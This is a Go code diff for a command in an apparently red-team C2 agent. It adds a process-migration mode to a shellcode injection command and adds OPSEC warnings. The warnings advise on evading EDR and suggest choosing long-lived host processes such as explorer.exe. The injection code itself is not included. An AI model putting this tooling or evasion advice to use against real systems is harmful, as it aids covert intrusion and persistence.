@@ -4,6 +4,8 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
+	"path/filepath"
+	"strings"
 
 	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
 	"github.com/MythicMeta/MythicContainer/logging"
@@ -12,16 +14,37 @@ import (
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "vanilla-injection",
-		Description:         "Perform vanilla remote process injection using VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread",
-		HelpString:          "vanilla-injection",
-		Version:             1,
+		Description:         "Perform vanilla remote process injection (inject shellcode or migrate agent into another process)",
+		HelpString:          "vanilla-injection -action inject -pid 1234 -filename shellcode.bin\nvanilla-injection -action migrate -pid 1234 -filename fawkes-shellcode.bin",
+		Version:             2,
 		MitreAttackMappings: []string{"T1055.001", "T1055.002"}, // Process Injection: Dynamic-link Library Injection, Portable Executable Injection
-		SupportedUIFeatures: []string{},
+		SupportedUIFeatures: []string{"process_browser:inject"},
 		Author:              "@galoryber",
+		AssociatedBrowserScript: &agentstructs.BrowserScript{ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "vanillainjection_new.js"), Author: "@galoryber"},
 		CommandAttributes: agentstructs.CommandAttribute{
 			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS},
 		},
 		CommandParameters: []agentstructs.CommandParameter{
+			{
+				Name:             "action",
+				ModalDisplayName: "Action",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
+				Description:      "inject: inject shellcode into target process. migrate: inject agent shellcode and exit current process (process migration)",
+				Choices:          []string{"inject", "migrate"},
+				DefaultValue:     "inject",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{
+						ParameterIsRequired: true,
+						GroupName:           "Default",
+						UIModalPosition:     0,
+					},
+					{
+						ParameterIsRequired: true,
+						GroupName:           "New File",
+						UIModalPosition:     0,
+					},
+				},
+			},
 			{
 				Name:                 "filename",
 				ModalDisplayName:     "Shellcode File",
@@ -34,7 +57,7 @@ func init() {
 					{
 						ParameterIsRequired: true,
 						GroupName:           "Default",
-						UIModalPosition:     0,
+						UIModalPosition:     1,
 					},
 				},
 			},
@@ -48,50 +71,64 @@ func init() {
 					{
 						ParameterIsRequired: true,
 						GroupName:           "New File",
-						UIModalPosition:     0,
+						UIModalPosition:     1,
 					},
 				},
 			},
 			{
-				Name:             "pid",
-				ModalDisplayName: "Target PID",
-				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
-				Description:      "The process ID to inject shellcode into",
-				DefaultValue:     0,
+				Name:                 "pid",
+				ModalDisplayName:     "Target PID",
+				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				Description:          "The process ID to inject shellcode into (for migrate: the process to migrate the agent into)",
+				DynamicQueryFunction: getProcessList,
+				DefaultValue:         "",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
 						ParameterIsRequired: true,
 						GroupName:           "Default",
-						UIModalPosition:     1,
+						UIModalPosition:     2,
 					},
 					{
 						ParameterIsRequired: true,
 						GroupName:           "New File",
-						UIModalPosition:     1,
+						UIModalPosition:     2,
 					},
 				},
 			},
 		},
 		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
-			pid, _ := taskData.Args.GetNumberArg("pid")
+			pid, _ := taskData.Args.GetStringArg("pid")
+			action, _ := taskData.Args.GetStringArg("action")
+			msg := fmt.Sprintf("OPSEC WARNING: Classic process injection into PID %s. "+
+				"Uses VirtualAllocEx + WriteProcessMemory + CreateRemoteThread — "+
+				"the most detectable injection pattern. Most EDR products hook these APIs. "+
+				"Consider threadless-inject or module-stomping for lower detection risk.", pid)
+			if action == "migrate" {
+				msg += fmt.Sprintf("\n\nMIGRATION WARNING: This will inject a new agent instance into PID %s "+
+					"and terminate the current agent process. The current callback will go offline. "+
+					"A new callback will appear from the target process. Ensure the target process "+
+					"is stable and long-lived (e.g., explorer.exe, svchost.exe).", pid)
+			}
 			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
-				TaskID:  taskData.Task.ID,
-				Success: true,
-				OpsecPreBlocked: false,
-				OpsecPreMessage: fmt.Sprintf("OPSEC WARNING: Classic process injection into PID %d. "+
-					"Uses VirtualAllocEx + WriteProcessMemory + CreateRemoteThread — "+
-					"the most detectable injection pattern. Most EDR products hook these APIs. "+
-					"Consider threadless-inject or module-stomping for lower detection risk.", int(pid)),
+				TaskID:             taskData.Task.ID,
+				Success:            true,
+				OpsecPreBlocked:    false,
+				OpsecPreMessage:    msg,
 				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
 			}
 		},
 		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
-			pid, _ := taskData.Args.GetNumberArg("pid")
+			pid, _ := taskData.Args.GetStringArg("pid")
+			action, _ := taskData.Args.GetStringArg("action")
+			msg := fmt.Sprintf("OPSEC AUDIT: Classic injection (VirtualAllocEx+WriteProcessMemory+CreateRemoteThread) queued for PID %s. Artifact registered.", pid)
+			if action == "migrate" {
+				msg += " MIGRATION: Current agent will self-terminate after injection. Monitor for new callback from target process."
+			}
 			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
 				TaskID:              taskData.Task.ID,
 				Success:             true,
 				OpsecPostBlocked:    false,
-				OpsecPostMessage:    fmt.Sprintf("OPSEC AUDIT: Classic injection (VirtualAllocEx+WriteProcessMemory+CreateRemoteThread) queued for PID %d. Artifact registered.", int(pid)),
+				OpsecPostMessage:    msg,
 				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
 			}
 		},
@@ -112,6 +149,12 @@ func init() {
 				TaskID:  taskData.Task.ID,
 			}
 
+			// Get action (default to "inject" for backward compatibility)
+			action, _ := taskData.Args.GetStringArg("action")
+			if action == "" {
+				action = "inject"
+			}
+
 			// Resolve file contents by checking actual args (not ParameterGroupName)
 			filename, fileContents, err := resolveFileContents(taskData)
 			if err != nil {
@@ -121,7 +164,7 @@ func init() {
 			}
 
 			// Get the target PID
-			pid, err := taskData.Args.GetNumberArg("pid")
+			pid, err := parsePIDFromArg(taskData)
 			if err != nil {
 				logging.LogError(err, "Failed to get PID")
 				response.Success = false
@@ -136,15 +179,25 @@ func init() {
 			}
 
 			// Build the display parameters
-			displayParams := fmt.Sprintf("Shellcode: %s (%d bytes)\nTarget PID: %d", filename, len(fileContents), int(pid))
+			actionLabel := "Inject"
+			if action == "migrate" {
+				actionLabel = "Migrate"
+			}
+			displayParams := fmt.Sprintf("Action: %s\nShellcode: %s (%d bytes)\nTarget PID: %d", actionLabel, filename, len(fileContents), pid)
 			response.DisplayParams = &displayParams
-			createArtifact(taskData.Task.ID, "Process Inject", fmt.Sprintf("VirtualAllocEx/WriteProcessMemory/CreateRemoteThread into PID %d (%d bytes)", int(pid), len(fileContents)))
+
+			artifactDesc := fmt.Sprintf("VirtualAllocEx/WriteProcessMemory/CreateRemoteThread into PID %d (%d bytes)", pid, len(fileContents))
+			if action == "migrate" {
+				artifactDesc += " [MIGRATE: agent will self-terminate after injection]"
+			}
+			createArtifact(taskData.Task.ID, "Process Inject", artifactDesc)
 
 			// Build the actual parameters JSON that will be sent to the agent
 			// Encode shellcode contents as base64 to embed in JSON
 			params := map[string]interface{}{
 				"shellcode_b64": base64.StdEncoding.EncodeToString(fileContents),
-				"pid":           int(pid),
+				"pid":           pid,
+				"action":        action,
 			}
 
 			paramsJSON, err := json.Marshal(params)
@@ -158,6 +211,24 @@ func init() {
 			// Set the parameters as a JSON string
 			taskData.Args.SetManualArgs(string(paramsJSON))
 
+			return response
+		},
+		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
+			response := agentstructs.PTTaskProcessResponseMessageResponse{
+				TaskID:  processResponse.TaskData.Task.ID,
+				Success: true,
+			}
+			responseText, ok := processResponse.Response.(string)
+			if !ok || responseText == "" {
+				return response
+			}
+			action, _ := processResponse.TaskData.Args.GetStringArg("action")
+			if action == "migrate" && strings.Contains(responseText, "completed successfully") {
+				pid, _ := processResponse.TaskData.Args.GetStringArg("pid")
+				createArtifact(processResponse.TaskData.Task.ID, "Process Migration",
+					fmt.Sprintf("Agent migrated into PID %s via CreateRemoteThread injection. "+
+						"Original agent process terminated. New callback expected from target process.", pid))
+			}
 			return response
 		},
 	})
